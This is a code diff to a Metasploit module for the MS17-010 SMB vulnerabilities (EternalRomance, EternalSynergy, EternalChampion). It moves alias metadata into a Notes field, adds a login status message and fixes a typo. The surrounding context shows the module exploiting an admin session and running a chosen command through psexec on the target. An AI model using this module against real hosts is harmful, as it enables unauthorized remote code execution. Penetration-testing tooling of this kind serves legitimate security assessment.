@@ -32,10 +32,6 @@ class MetasploitModule < Msf::Auxiliary
 
       'License'        => MSF_LICENSE,
       'References'     => [
-        [ 'AKA', 'ETERNALSYNERGY' ],
-        [ 'AKA', 'ETERNALROMANCE' ],
-        [ 'AKA', 'ETERNALCHAMPION' ],
-        [ 'AKA', 'ETERNALBLUE'],  # does not use any CVE from Blue, but Search should show this, it is preferred
         [ 'MSB', 'MS17-010' ],
         [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests
         [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests
@@ -44,7 +40,16 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],
         [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],
       ],
-      'DisclosureDate' => 'Mar 14 2017'
+      'DisclosureDate' => 'Mar 14 2017',
+      'Notes' =>
+          {
+              'AKA' => [
+                  'ETERNALSYNERGY',
+                  'ETERNALROMANCE',
+                  'ETERNALCHAMPION',
+                  'ETERNALBLUE'      # does not use any CVE from Blue, but Search should show this, it is preferred
+              ]
+          }
     ))
 
     register_options([
@@ -66,6 +71,9 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
 
     begin
+      if datastore['SMBUser'].present?
+        print_status("Authenticating to #{ip} as user '#{splitname(datastore['SMBUser'])}'...")
+      end
       eternal_pwn(ip)         # exploit Admin session
       smb_pwn(ip)             # psexec
 
@@ -96,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, datastore['RETRY'], datastore['DELAY'])
 
     # Report output
-    print_good("Command completed successfuly!")
+    print_good("Command completed successfully!")
     print_status("Output for \"#{datastore['COMMAND']}\":\n")
     print_line("#{output}\n")
     report_note(
